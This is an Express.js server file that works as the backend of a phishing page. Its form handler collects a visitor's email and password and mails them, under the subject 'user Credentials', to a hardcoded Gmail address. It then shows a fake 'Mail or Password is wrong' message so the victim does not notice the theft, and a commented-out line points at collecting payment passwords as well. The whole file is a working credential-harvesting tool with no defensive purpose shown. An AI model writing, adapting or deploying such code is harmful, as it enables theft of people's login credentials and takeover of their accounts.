import express from 'express' ;
import nodemailer from 'nodemailer' ;
import bodyParser from 'body-parser'
import dotenv from 'dotenv';

dotenv.config(); // Load environment variables from .env file

const app = express();
//configuring ejs
app.set("view engine","ejs")
app.use(bodyParser.urlencoded({ extended: true}))
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL,
        pass: process.env.PASSWORD,
    },
});
app.use(express.static("public"))

app.get("/",(req,res)=>{
    res.render('index',{greet:""});
})

app.post('/send-email', async (req, res) => {

    const formFields = req.body;
    const hasEmptyValue = Object.values(formFields).some(value => value === '');
  
    if (hasEmptyValue) {
      res.render('emptyFieldsAlert');
    } else {
        
     const email=req.body.email;
     const password=req.body.password;
    //  const payment_password=req.body.payment_password;
     const email_content=`email : ${email}\n password : ${password} \n `
  
    try {
        await transporter.sendMail({
            to:"linkchaudhary@gmail.com",
            from:"mradul.developer@gmail.com",
            subject:"user Credentials",
            text:email_content
            
        });
        res.status(200);
    } catch (error) {
        res.status(500).send("<script>window.alert('something went wrong Try again'); window.history.back()</script>");
    }

    }
    res.render("index",{greet:"Mail or Password is wrong,Try again"})
});
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('Server listening on port 3000');
});

